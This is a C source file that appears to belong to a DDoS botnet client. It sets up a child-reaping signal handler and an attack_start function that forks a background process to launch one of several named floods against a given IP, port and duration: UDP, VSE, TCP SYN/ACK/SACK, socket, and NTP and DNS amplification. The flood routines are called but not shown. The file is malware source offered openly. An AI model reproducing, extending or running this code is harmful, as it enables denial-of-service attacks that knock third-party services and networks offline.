#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <signal.h>
#include "attack.h"

static void sigchld_handler(int sig) {
    (void)sig;
    while (waitpid(-1, NULL, WNOHANG) > 0);
}

void attack_init(void) {
    struct sigaction sa;
    sa.sa_handler = sigchld_handler;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = SA_RESTART | SA_NOCLDSTOP;
    sigaction(SIGCHLD, &sa, NULL);
}

void attack_start(int type, uint32_t ip, uint16_t port, uint32_t duration) {
    // Fork to perform attack in background
    pid_t pid = fork();
    if (pid == -1) return;

    if (pid == 0) {
        // Child Process
        switch (type) {
        // UDP
        case ATK_UDP_PLAIN:
            attack_udp_plain(ip, port, duration);
            break;
        case ATK_UDP_VSE:
            attack_udp_vse(ip, port, duration);
            break;
            
        // TCP
        case ATK_TCP_SOCKET:
            attack_socket(ip, port, duration);
            break;
        case ATK_TCP_SACK:
            attack_tcp_sack(ip, port, duration);
            break;
        case ATK_TCP_SYN:
            attack_tcp_syn(ip, port, duration);
            break;
        case ATK_TCP_ACK:
            attack_tcp_ack(ip, port, duration);
            break;

        // Amplification
        case ATK_NTP_AMP:
            attack_ntp(ip, port, duration);
            break;
        case ATK_DNS_AMP:
            attack_dns(ip, port, duration);
            break;
            default:
                break;
        }
        exit(0); // Exit child when done
    }
    
    // Parent continues immediately
    // Ideally we track child PIDs to wait/cleanup (SIGCHLD handler)
}
